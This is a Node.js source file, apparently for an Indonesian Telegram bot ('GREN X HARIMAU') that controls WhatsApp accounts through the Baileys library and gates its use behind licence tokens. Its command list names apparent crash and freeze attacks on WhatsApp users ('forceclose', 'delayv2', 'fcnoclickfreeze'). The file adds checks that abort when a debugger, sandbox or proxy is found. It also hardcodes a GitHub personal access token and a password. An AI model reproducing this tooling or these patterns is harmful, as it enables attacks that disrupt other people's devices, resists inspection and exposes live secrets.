const {
    default: makeWASocket,
    useMultiFileAuthState,
    encodeSignedDeviceIdentity,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    fetchLatestBaileysVersion, 
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    baileys, 
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const Module = require("module");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require('axios');
const acorn = require('acorn');
const FormData = require('form-data');
const moment = require('moment-timezone');
const vm = require('vm');
const { fileTypeFromBuffer } = require('file-type');
const github = {
  token: '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',
  repoOwner: 'khususbanding749-ai',
  repoName: 'GrenTzy1',
  akunPath: 'akun.json',
  tokenPath: 'token.json'
};

try {
  if (
    typeof axios.get !== 'function' ||
    typeof axios.create !== 'function' ||
    typeof axios.interceptors !== 'object' ||
    !axios.defaults
  ) {
    console.error(`[SECURITY] Axios telah dimodifikasi`);
    process.abort();
  }

  if (
    axios.interceptors.request.handlers.length > 0 ||
    axios.interceptors.response.handlers.length > 0
  ) {
    console.error(`[SECURITY] Axios interceptor aktif (bypass terdeteksi)`);
    process.abort();
  }

  const env = process.env;
  if (
    env.HTTP_PROXY || env.HTTPS_PROXY || env.NODE_TLS_REJECT_UNAUTHORIZED === '0'
  ) {
    console.error(`[SECURITY] Proxy atau TLS bypass aktif`);
    process.abort();
  }

  const execArgs = process.execArgv.join(' ');
  if (/--inspect|--debug|repl|vm2|sandbox/i.test(execArgs)) {
    console.error(`[SECURITY] Debugger / sandbox / VM terdeteksi`);
    process.abort();
  }

  const realToString = Function.prototype.toString.toString();
  if (Function.prototype.toString.toString() !== realToString) {
    console.error(`[SECURITY] Function.toString dibajak`);
    process.abort();
  }

  const mod = require('module');
  const _load = mod._load.toString();
  if (!_load.includes('tryModuleLoad') && !_load.includes('Module._load')) {
    console.error(`[SECURITY] Module._load telah dibajak`);
    process.abort();
  }

  const cache = Object.keys(require.cache || {});
  const suspicious = cache.filter(k =>
    k.includes('axios') &&
    !/node_modules[\\/]+axios[\\/]+(dist[\\/]+node[\\/]+axios\.cjs|index\.js)$/.test(k)
  );

  if (suspicious.length > 0) {
    console.error(`[SECURITY] require.cache mencurigakan`);
    process.abort();
  }

} catch (err) {
  console.error(`[SECURITY] Proteksi gagal jalan:`, err);
  process.abort();
}
console.log("✅ Proteksi Anti Bypass Active ./Xata");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}


function saveOwners(owners) {
    try {
        console.log('Mencoba menyimpan owners ke:', OWNERS_FILE);
        console.log('Izin direktori:', fs.statSync(path.dirname(OWNERS_FILE)).mode);
        fs.writeFileSync(OWNERS_FILE, JSON.stringify(owners, null, 2), 'utf8');
        console.log('✅ Owners saved:', owners);
        return true;
    } catch (err) {
        console.error('❌ Gagal save owners:', err.message);
        console.error('Detail error:', err);
        return false;
    }
}

const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

const PREMIUM_GROUP_MODE_FILE = "./premiumGroupMode.json";
let premiumGroupOnly = false;

function loadPremiumGroupMode() {
  try {
    if (fs.existsSync(PREMIUM_GROUP_MODE_FILE)) {
      const data = JSON.parse(fs.readFileSync(PREMIUM_GROUP_MODE_FILE, 'utf8'));
      premiumGroupOnly = data.enabled === true;
    } else {
      savePremiumGroupMode();
    }
  } catch (e) {
    premiumGroupOnly = false;
    savePremiumGroupMode();
  }
}

function savePremiumGroupMode() {
  fs.writeFileSync(PREMIUM_GROUP_MODE_FILE, JSON.stringify({ enabled: premiumGroupOnly }, null, 2));
}

loadPremiumGroupMode();

function checkPremiumGroupAccess(msg) {
  if (!premiumGroupOnly) return true;

  if (msg.chat.type === "private") return true;

  return isPremGroup(msg.chat.id);
}

function escapeHtml(text) {
  if (!text) return '';
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function getEmojiVersion(emoji) {
  const cp = [...emoji].map(ch => ch.codePointAt(0));
  if (cp.some(c => c >= 0x1FA70 && c <= 0x1FAFF)) return '15.0 (2022)';
  if (cp.some(c => c >= 0x1F90C && c <= 0x1F93F)) return '14.0 (2021)';
  if (cp.some(c => c >= 0x1F9E0 && c <= 0x1F9FF)) return '13.0 (2020)';
  if (cp.some(c => c >= 0x1F970 && c <= 0x1F9CF)) return '12.0 (2019)';
  if (cp.some(c => c >= 0x1F600 && c <= 0x1F64F)) return '11.0 (2018)';
  return '≥ 10.0 (2017)';
}

async function kirimInfoStiker(chatId, st) {
  let reply = `🖼️ <b>Informasi Stiker</b>\n`;
  reply += `• file_id: <code>${escapeHtml(st.file_id)}</code>\n`;
  reply += `• file_unique_id: <code>${escapeHtml(st.file_unique_id)}</code>\n`;
  reply += `• Emoji: ${escapeHtml(st.emoji || '–')}\n`;
  reply += `• Ukuran: ${st.width}×${st.height}\n`;
  reply += `• Animasi: ${st.is_animated ? '✅ Ya' : '❌ Tidak'}\n`;
  reply += `• Video: ${st.is_video ? '✅ Ya' : '❌ Tidak'}\n`;

  if (st.set_name) {
    reply += `• Nama Pack: <code>${escapeHtml(st.set_name)}</code>\n`;
    try {
      const pack = await bot.getStickerSet(st.set_name);
      reply += `• Judul Pack: <b>${escapeHtml(pack.title)}</b>\n`;
      reply += `• Jumlah stiker: ${pack.stickers.length}\n`;
      if (pack.creator && pack.creator.username) {
        reply += `• Kreator: @${escapeHtml(pack.creator.username)}\n`;
      }
    } catch (e) {
      reply += `• (Tidak dapat mengambil detail pack)\n`;
    }
  } else {
    reply += `• Stiker ini <i>tidak</i> berasal dari pack.\n`;
  }

  await bot.sendMessage(chatId, reply, { parse_mode: 'HTML' });
}

// fungsi video 
async function kirimInfoVideo(chatId, media, captionText) {
  let caption = `🎬 <b>Informasi Video</b>\n`;
  caption += `• file_id: <code>${escapeHtml(media.file_id)}</code>\n`;
  caption += `• file_unique_id: <code>${escapeHtml(media.file_unique_id)}</code>\n`;
  caption += `• Durasi: ${media.duration} detik\n`;
  if (media.width && media.height) {
    caption += `• Resolusi: ${media.width}×${media.height}\n`;
  }
  if (media.video_note) {
    caption += `• Tipe: Video Note\n`;
  } else if (media.animation) {
    caption += `• Tipe: GIF / Animasi\n`;
  } else {
    caption += `• Tipe: Video\n`;
    if (media.mime_type) caption += `• Mime Type: ${media.mime_type}\n`;
    if (media.file_size) caption += `• Ukuran: ${(media.file_size / 1024).toFixed(2)} KB\n`;
    if (media.thumb) {
      caption += `• Thumbnail: ${media.thumb.width}×${media.thumb.height}\n`;
    }
  }
  if (captionText) {
    caption += `• Caption: ${escapeHtml(captionText)}\n`;
  }
  await bot.sendMessage(chatId, caption, { parse_mode: 'HTML' });
}

// fungsi emoji
async function kirimInfoEmoji(chatId, emoji, msg = null) {
  if (msg && msg.entities && msg.entities.length > 0) {
    for (const entity of msg.entities) {
      if (entity.type === 'custom_emoji') {
        const customEmojiId = entity.custom_emoji_id;
        const emojiText = msg.text || msg.caption || '';
        const emojiChar = emojiText.slice(entity.offset, entity.offset + entity.length);

        let reply = `⭐ <b>Custom Emoji (Premium)</b>\n`;
        reply += `• Emoji: ${emojiChar}\n`;
        reply += `• custom_emoji_id: <code>${customEmojiId}</code>\n`;
        reply += `• Panjang: ${entity.length}\n`;
        reply += `• Offset: ${entity.offset}\n`;

        return bot.sendMessage(chatId, reply, { parse_mode: 'HTML' });
      }
    }
  }

  const codePoints = [...emoji].map(ch => ch.codePointAt(0).toString(16).toUpperCase());
  const unicode = codePoints.join(' ');

  let reply = `😀 <b>Informasi Emoji (Biasa)</b>\n`;
  reply += `• Emoji: ${emoji}\n`;
  reply += `• Unicode: <code>${unicode}</code>\n`;
  reply += `• Code Points: <code>${codePoints.map(cp => 'U+' + cp).join(' ')}</code>\n`;
  reply += `• Panjang (bytes): ${Buffer.from(emoji, 'utf8').length} bytes\n`;
  reply += `• Panjang karakter: ${[...emoji].length}\n`;
  reply += `• Versi: ${getEmojiVersion(emoji)}\n`;

  await bot.sendMessage(chatId, reply, { parse_mode: 'HTML' });
}

// KONFIGURASI OWNER
const MAIN_OWNER_ID = 8508651359; 
const OWNERS_FILE = './database/owners.json';

const USERS_FILE = path.join(__dirname, 'database', 'users.json');

if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });

// FUNGSI LOAD & SAVE OWNER
function loadOwners() {
    try {
        if (fs.existsSync(OWNERS_FILE)) {
            const data = fs.readFileSync(OWNERS_FILE, 'utf8');
            const owners = JSON.parse(data);
            if (!owners.includes(MAIN_OWNER_ID)) {
                owners.push(MAIN_OWNER_ID);
                saveOwners(owners);
            }
            return owners;
        } else {
            const defaultOwners = [MAIN_OWNER_ID];
            saveOwners(defaultOwners);
            return defaultOwners;
        }
    } catch (err) {
        console.error('❌ Gagal load owners:', err.message);
        return [MAIN_OWNER_ID];
    }
}

function saveOwners(owners) {
    try {
        fs.writeFileSync(OWNERS_FILE, JSON.stringify(owners, null, 2), 'utf8');
        console.log('✅ Owners saved to', OWNERS_FILE);
        return true;
    } catch (err) {
        console.error('❌ Gagal save owners:', err.message);
        return false;
    }
}

function isOwner(userId) {
    if (userId === MAIN_OWNER_ID) return true;
    const owners = loadOwners();
    return owners.includes(userId);
}

const senders = new Map();
let defaultSender = null;

// FUNGSI TAMBAH SENDER
async function addSender(botNumber, chatId, botTelegram) {
  if (senders.has(botNumber)) {
    await botTelegram.sendMessage(chatId, `⚠️ Sender ${botNumber} sudah terhubung.`);
    return false;
  }

  try {
    const sock = await connectToWhatsApp(botNumber, chatId, botTelegram);
    if (sock) {
      senders.set(botNumber, sock);
      await botTelegram.sendMessage(chatId, `✅ Sender ${botNumber} berhasil ditambahkan.`);
      return true;
    } else {
      await botTelegram.sendMessage(chatId, `❌ Gagal menambahkan sender ${botNumber}.`);
      return false;
    }
  } catch (error) {
    console.error(`Error adding sender ${botNumber}:`, error);
    await botTelegram.sendMessage(chatId, `❌ Error: ${error.message}`);
    return false;
  }
}

// FUNGSI GET SENDER AKTIF
function getActiveSender() {
  if (defaultSender && senders.has(defaultSender)) {
    return senders.get(defaultSender);
  }
  const firstKey = senders.keys().next().value;
  return firstKey ? senders.get(firstKey) : null;
}

function saveUser(userId) {
    try {
        let users = [];
        if (fs.existsSync(USERS_FILE)) {
            users = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
        }
        if (!users.includes(userId)) {
            users.push(userId);
            fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
            console.log(`User baru ditambahkan: ${userId}`);
        }
    } catch (err) {
        console.error('Gagal simpan user:', err.message);
    }
}

function getAllUsers() {
    try {
        if (!fs.existsSync(USERS_FILE)) return [];
        return JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
    } catch (err) {
        console.error('Gagal baca users:', err.message);
        return [];
    }
}

// NOTIFIKASI KE SEMUA USER
async function notifyAllUsersRestart() {
    const usersFilePath = path.join(__dirname, 'database', 'users.json');
    let users = [];

    try {
        if (fs.existsSync(usersFilePath)) {
            const data = fs.readFileSync(usersFilePath, 'utf8');
            const parsed = JSON.parse(data);
            if (Array.isArray(parsed)) users = parsed;
            else return;
        } else return;
    } catch (err) {
        return;
    }

    if (users.length === 0) return;

    console.log(`Mengirim notifikasi restart ke ${users.length} user...`);
    let success = 0;
    let invalidUsers = [];

    for (const userId of users) {
        try {
            await bot.sendMessage(userId, "✅ Bot telah selesai direstart dan sekarang ready kembali!");
            success++;
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (err) {
            invalidUsers.push(userId);
        }
    }

    if (invalidUsers.length > 0) {
        const validUsers = users.filter(id => !invalidUsers.includes(id));
        fs.writeFileSync(usersFilePath, JSON.stringify(validUsers, null, 2));
        console.log(`🧹 Dihapus ${invalidUsers.length} user tidak valid dari database.`);
    }

    console.log(`Notifikasi restart: ${success} berhasil, ${invalidUsers.length} user dihapus.`);
}

// FUNGSI RESTART
const RESTART_NOTIFY_FILE = path.join(__dirname, 'database', 'restart_notify.json');

if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });

function saveRestartNotify(chatId) {
    fs.writeFileSync(RESTART_NOTIFY_FILE, JSON.stringify({ chatId: chatId, timestamp: Date.now() }), 'utf8');
}

function clearRestartNotify() {
    if (fs.existsSync(RESTART_NOTIFY_FILE)) {
        fs.unlinkSync(RESTART_NOTIFY_FILE);
    }
}

async function notifyRestartSuccess(bot) {
    try {
        if (fs.existsSync(RESTART_NOTIFY_FILE)) {
            const data = JSON.parse(fs.readFileSync(RESTART_NOTIFY_FILE, 'utf8'));
            const chatId = data.chatId;
            try {
                await bot.sendMessage(chatId, "✅ Bot berhasil direstart dan sekarang online kembali.");
                clearRestartNotify();
                console.log(`✅ Notifikasi restart sukses dikirim ke ${chatId}`);
            } catch (sendErr) {
            
                if (sendErr.response && sendErr.response.statusCode === 400 && 
                    sendErr.response.description && sendErr.response.description.includes("chat not found")) {
                    console.log(`⚠️ User ${chatId} belum pernah chat dengan bot, notifikasi diabaikan.`);
                } else {
                    console.error(`❌ Gagal mengirim notifikasi ke ${chatId}:`, sendErr.message);
                }
                clearRestartNotify();
            }
        }
    } catch (err) {
        console.error("❌ Gagal membaca file notifikasi restart:", err.message);
    }
}

const pwFile = path.join(__dirname, 'password.json');
if (!fs.existsSync(pwFile)) fs.writeFileSync(pwFile, JSON.stringify({ password: null }, null, 2));
function loadPassword() { try { return JSON.parse(fs.readFileSync(pwFile)); } catch (e) { return { password: null }; } }
function savePassword(obj) { fs.writeFileSync(pwFile, JSON.stringify(obj, null, 2)); }


let onlyGroup = false;

let passwordDB = { password: null };
function savePassword(db) {
    fs.writeFileSync('./password.json', JSON.stringify(db, null, 2));
}

function getRandomMedia() {
  const media = [
    { type: "video", url: "https://files.catbox.moe/s02rkg.mp4" },
    { type: "video", url: "https://files.catbox.moe/s02rkg.mp4" }
  ];
  return media[Math.floor(Math.random() * media.length)];
}

function loadActiveSessions() {
    try {
        if (fs.existsSync(SESSIONS_FILE)) {
            return JSON.parse(fs.readFileSync(SESSIONS_FILE));
        }
    } catch (e) {}
    return [];
}

function getBotRuntime() {
    const uptimeSeconds = process.uptime();
    const days = Math.floor(uptimeSeconds / 86400);
    const hours = Math.floor((uptimeSeconds % 86400) / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);
    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

function getCurrentDate() {
    const now = new Date();
    return now.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
}

function formatRuntime(seconds) {
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${days}d ${hours}h ${minutes}m ${secs}s`;
}

// FILE STORAGE HELPERS
function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

function loadChats() {
    if (!fs.existsSync(CHATS_FILE)) return [];
    try { return JSON.parse(fs.readFileSync(CHATS_FILE, 'utf8')); } catch { return []; }
}
function saveChats(chats) { fs.writeFileSync(CHATS_FILE, JSON.stringify(chats, null, 2)); }
function addChat(chatId) {
    let chats = loadChats();
    if (!chats.includes(chatId)) { chats.push(chatId); saveChats(chats); return true; }
    return false;
}
function removeChat(chatId) {
    let chats = loadChats();
    const newChats = chats.filter(id => id !== chatId);
    if (newChats.length !== chats.length) { saveChats(newChats); return true; }
    return false;
}

function loadOwners() {
    if (!fs.existsSync(OWNERS_FILE)) return [];
    try { return JSON.parse(fs.readFileSync(OWNERS_FILE, 'utf8')); } catch { return []; }
}
function saveOwners(owners) { fs.writeFileSync(OWNERS_FILE, JSON.stringify(owners, null, 2)); }
function addOwner(userId) {
    let owners = loadOwners();
    if (!owners.includes(userId)) { owners.push(userId); saveOwners(owners); return true; }
    return false;
}
function removeOwner(userId) {
    let owners = loadOwners();
    const newOwners = owners.filter(id => id !== userId);
    if (newOwners.length !== owners.length) { saveOwners(newOwners); return true; }
    return false;
}

let BOT_ACTIVE = true;
let GLOBAL_PASSWORD = "GrenTzy";

let verifiedData = {
  tokenVerified: [],
  fullyVerified: []
};
const VERIFIED_FILE = "./verified.json";

function loadVerifiedData() {
  try {
    if (fs.existsSync(VERIFIED_FILE)) {
      const data = fs.readFileSync(VERIFIED_FILE, "utf8");
      verifiedData = JSON.parse(data);
    } else {
      saveVerifiedData();
    }
  } catch (err) {
    console.error("Gagal load verified data:", err);
  }
}

function blockIfPM(msg) {
    if (onlyGroup && msg.chat.type === "private") {
        bot.sendMessage(msg.chat.id, "❌ Bot hanya bisa digunakan di grup saat ini. Mode *Only Group* sedang aktif.", { parse_mode: "Markdown" });
        return true;
    }
    return false;
}

function saveVerifiedData() {
  fs.writeFileSync(VERIFIED_FILE, JSON.stringify(verifiedData, null, 2));
}

const GROUP_MODE_FILE = "./groupmode.json";

function loadGroupMode() {
    try {
        if (fs.existsSync(GROUP_MODE_FILE)) {
            const data = JSON.parse(fs.readFileSync(GROUP_MODE_FILE, 'utf8'));
            onlyGroup = data.onlyGroup === true;
        } else {
            saveGroupMode();
        }
    } catch (err) {
        console.error("Gagal load group mode:", err.message);
        onlyGroup = false;
        saveGroupMode();
    }
}
function saveGroupMode() {
    try {
        fs.writeFileSync(GROUP_MODE_FILE, JSON.stringify({ onlyGroup }, null, 2));
    } catch (err) {
        console.error("Gagal save group mode:", err.message);
    }
}
loadGroupMode();

function isAdminOrPremium(userId) {
    const isAdmin = (typeof adminUsers !== 'undefined' && adminUsers.includes(String(userId)));
    const isPremium = (typeof premiumUsers !== 'undefined' && premiumUsers.some(p => String(p.id) === String(userId)));
    return isAdmin || isPremium;
}

function checkGroupOnly(msg) {
    if (onlyGroup && msg.chat.type === "private") {
        bot.sendMessage(msg.chat.id, "❌ Bot hanya bisa digunakan di grup saat ini.");
        return false;
    }
    return true;
}

loadVerifiedData();

// OTORITASI
const antrianStatus = new Map();

function isAntrianEnabled(chatId) {
    return antrianStatus.get(chatId) === true;
}

function setAntrianEnabled(chatId, enabled) {
    if (enabled) {
        antrianStatus.set(chatId, true);
    } else {
        antrianStatus.delete(chatId);
    }
}

function enqueueTestFunc(chatId, executionFunction) {
    if (!isAntrianEnabled(chatId)) {
        return executionFunction();
    }
    return new Promise((resolve, reject) => {
        if (!testfuncQueues.has(chatId)) {
            testfuncQueues.set(chatId, []);
        }
        const queue = testfuncQueues.get(chatId);
        queue.push({ resolve, reject, run: executionFunction });
        if (queue.length === 1) {
            processNextTestFunc(chatId);
        } else {
            bot.sendMessage(chatId, `⏳ *Command dalam antrian!* Posisi: ${queue.length}. Harap tunggu giliran...`, { parse_mode: 'Markdown' })
                .catch(() => {});
        }
    });
}

async function processNextTestFunc(chatId) {
    const queue = testfuncQueues.get(chatId);
    if (!queue || queue.length === 0) return;
    const current = queue[0];
    try {
        const result = await current.run();
        current.resolve(result);
    } catch (err) {
        current.reject(err);
    } finally {
        queue.shift();
        if (queue.length > 0) {
            processNextTestFunc(chatId);
        }
    }
}

// KONFIGURASI GITHUB
const GITHUB_API_URL = "https://api.github.com/repos/khususbanding749-ai/GrenTzy1/contents/token.json";
const GITHUB_PERSONAL_ACCESS_TOKEN = "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";


async function restartBot(chatId, reason = "Restart perintah owner") {
    const botInstance = bot;
    await botInstance.sendMessage(chatId, `🔄 Bot akan direstart. Alasan: ${reason}`);
    console.log(`🔄 Restart bot: ${reason}`);
    setTimeout(() => {
        process.exit(0);
    }, 2000);
}


const commandWhitelist = new Map();
const commandDenylist = new Map();

const allCommands = ["delayv2", "delayv1", "forceclose", "blankclickgren", "fcnoclickfreeze", "harimaucombo"];

async function isCommandAllowed(userId, command) {
  if (userId === MAIN_OWNER_ID) return true;
  const allowed = commandWhitelist.get(userId) || new Set();
  return allowed.has(command);
}

setTimeout(() => {
    notifyAllUsersRestart();
}, 3000);

// SIMPAN TOKEN DI FILE LOKAL
const headers = {
  Authorization: `Bearer ${github.token}`,
  Accept: 'application/vnd.github.v3+json'
};

async function getGitHubContent(filePath) {
  try {
    const { data } = await axios.get(
      `https://api.github.com/repos/${github.repoOwner}/${github.repoName}/contents/${filePath}`,
      { headers }
    );
    const content = Buffer.from(data.content, 'base64').toString('utf8');
    return { content: JSON.parse(content), sha: data.sha };
  } catch (err) {
    if (err.response?.status === 404) {
      if (filePath === github.akunPath) return { content: [], sha: null };
      if (filePath === github.tokenPath) return { content: { tokens: [] }, sha: null };
      return { content: [], sha: null };
    }
    console.error("GITHUB ERROR:", err.response?.data || err.message);
    throw new Error("Gagal mengambil data dari GitHub.");
  }
}

async function updateGitHubContent(filePath, newContent, sha) {
  const payload = {
    message: `Update file ${filePath}`,
    content: Buffer.from(JSON.stringify(newContent, null, 2)).toString('base64'),
    sha: sha || undefined
  };
  await axios.put(
    `https://api.github.com/repos/${github.repoOwner}/${github.repoName}/contents/${filePath}`,
    payload,
    { headers }
  );
}

// Akun & Token Helpers
async function addAkun(username, password) {
  const { content, sha } = await getGitHubContent(github.akunPath);
  const arr = Array.isArray(content) ? content : [];
  const exist = arr.find(u => String(u.username) === String(username));
  if (exist) throw new Error("Username sudah terdaftar.");
  arr.push({ username: String(username), password: String(password) });
  await updateGitHubContent(github.akunPath, arr, sha);
}

async function deleteAkun(username) {
  const { content, sha } = await getGitHubContent(github.akunPath);
  const arr = Array.isArray(content) ? content : [];
  const filtered = arr.filter(u => String(u.username) !== String(username));
  if (filtered.length === arr.length) throw new Error("Username tidak ditemukan.");
  await updateGitHubContent(github.akunPath, filtered, sha);
}

async function addToken(token) {
  const { content, sha } = await getGitHubContent(github.tokenPath);
  const obj = (content && typeof content === 'object') ? content : { tokens: [] };
  if (!Array.isArray(obj.tokens)) obj.tokens = [];
  if (obj.tokens.includes(token)) throw new Error("Token sudah ada.");
  obj.tokens.push(token);
  await updateGitHubContent(github.tokenPath, obj, sha);
}

async function deleteToken(token) {
  const { content, sha } = await getGitHubContent(github.tokenPath);
  const obj = (content && typeof content === 'object') ? content : { tokens: [] };
  if (!Array.isArray(obj.tokens)) throw new Error("Format token.json tidak valid.");
  const filtered = obj.tokens.filter(t => t !== token);
  if (filtered.length === obj.tokens.length) throw new Error("Token tidak ditemukan.");
  obj.tokens = filtered;
  await updateGitHubContent(github.tokenPath, obj, sha);
}

function isVVip(userId) {
  return vvipUsers.includes(userId.toString());
}


// File penyimpanan data VVIP
const VVIP_FILE = "./vvip.json";
let vvipUsers = [];

function loadVVip() {
  try {
    if (fs.existsSync(VVIP_FILE)) {
      vvipUsers = JSON.parse(fs.readFileSync(VVIP_FILE, "utf8"));
    } else {
      vvipUsers = [];
    }
  } catch (error) {
    console.error("Gagal load VVIP:", error);
    vvipUsers = [];
  }
}

function saveVVip() {
  fs.writeFileSync(VVIP_FILE, JSON.stringify(vvipUsers, null, 2));
}

loadVVip();

function isAdmin(userId) {
    return adminUsers.includes(String(userId));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, callback) {
    if (!fs.existsSync(filePath)) return;
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const data = JSON.parse(fs.readFileSync(filePath));
                callback(data);
            } catch (err) {
                console.error(`Error reading ${filePath}:`, err.message);
            }
        }
    });
}


watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });



// ==================== TOKEN VALIDATION ====================
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/khususbanding749-ai/GrenTzy1/refs/heads/main/token.json";

async function fetchValidTokens() {
    try {
        const response = await axios.get(GITHUB_TOKEN_LIST_URL);
        return response.data.tokens || [];
    } catch (error) {
        console.error(chalk.red(`❌ Gagal mengambil daftar token dari GitHub: ${error.message}`));
        return [];
    }
}

async function validateToken() {
    console.log(chalk.bold.cyan(`GREN X SYSTEM v5.3`));
    console.log(chalk.bold.cyan(`Memeriksa validasi token...`));

    const validTokens = await fetchValidTokens();
    if (!validTokens.length) {
        console.log(chalk.red(`
╔═══════════════════════════════════════════╗
║   ❌ TOKEN TIDAK VALID / DATABASE KOSONG  ║
╚═══════════════════════════════════════════╝
        `));
        process.exit(1);
    }

    if (!validTokens.includes(BOT_TOKEN)) {
        console.log(chalk.red(`
╔═══════════════════════════════════════════╗
║   ❌ TOKEN ANDA TIDAK TERDAFTAR           ║
║   Hubungi @GrenTzy untuk akses           ║
╚═══════════════════════════════════════════╝
        `));
        process.exit(1);
    }

    console.log(chalk.green(`✅ Token valid. Selamat datang di GREN X SYSTEM!`));
}

// Panggil validateToken sebelum menjalankan bot
validateToken().catch(() => process.exit(1));

async function startBot() {
  console.log(
    chalk.red(`
,----,                                         
,/   ,\`|                                         
,|   '  |               ,----,                    
|:..  : |             ,/   ,\`|                    
\`--'  / ;           ,|   '  |                    
,---.   ,/';           |:..  : |                    
,/   ,\` ,/'              \`--'  / ;                   
,|   '  ,/'             ,---.   ,/';                    
|:..  ,/'             ,/   ,\` ,/'                      
\`--',/'              ,|   '  ,/'                        
,---.\`               |:..  ,/'                         
,/   ,\`                \`--',/'                          
,|   '  |                 ---                               
|:..  : |                              
\`--'  / ;              
,---.   ,/';                                                
,/   ,\` ,/'                                                  
,|   '  ,/'
|:..  ,/'
\`--',/'
`)
  );

  console.log(
    chalk.bold.blue(`
══════════════════════════════════
       𝙏𝙃𝙀 GREN X HARIMAU
══════════════════════════════════
`)
  );
}

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (!fs.existsSync(SESSIONS_FILE)) {
      console.log("📭 Tidak ada sesi tersimpan.");
      return;
    }
    const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    console.log(`🔎 Ditemukan ${activeNumbers.length} nomor aktif di daftar *Samurai List* 📜`);

    for (const botNumber of activeNumbers) {
